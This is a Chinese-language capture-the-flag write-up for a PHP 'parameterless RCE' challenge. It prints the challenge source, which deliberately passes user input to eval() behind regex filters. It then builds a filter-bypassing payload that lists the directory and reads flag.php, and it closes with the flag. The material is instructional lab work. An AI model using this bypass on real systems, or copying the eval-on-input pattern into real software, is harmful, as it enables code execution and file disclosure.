## 禁止套娃

> 无参数RCE

用githack读出源代码

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>

```

1. 首先对当前目录进行扫描,正常来说直接用`getcwd()`就可以直接获取当前目录,但是题目过滤了`et`字符,因此需要特殊构造

`localeconv`函数返回一包含本地数字及货币格式信息的数组,关键在于其第一个元素是小数点,因此可以构造`var_dump(scandir(current(localeconv())));`来读取当前目录

返回如下数据`array(5) {  [0]=>  string(1) "."  [1]=>  string(2) ".."  [2]=>  string(4) ".git"  [3]=>  string(8) "flag.php"  [4]=>  string(9) "index.php" }`

2. 想办法对`flag.php`进行读取

首先`file_get_contents`因为关键词`et`已经被过滤,可以使用`highlight_file`进行代替

使用`array_rand`可以随机返回数组中的一个键名

```php
<?php
$a=array(".","..",".git","flag.php","index.php");
$random_keys=array_rand($a);
echo $random_keys;
echo $a[$random_keys];
?>
```

但是只使用键名不能直接读取`flag.php`,而`array_flip`可以反转/交换数组中所有的键名以及它们关联的键值

```php
<?php
$a=array(".","..",".git","flag.php","index.php");
$a=array_flip($a);
$random_keys=array_rand($a);
echo $random_keys;
?>
```

由此可以读取到`flag.php`

payload`highlight_file(array_rand(array_flip(scandir(current(localeconv())))));`

刷新多几次即可getflag`flag{f5ec0db8-27cb-47f7-8793-05b69a033364}`

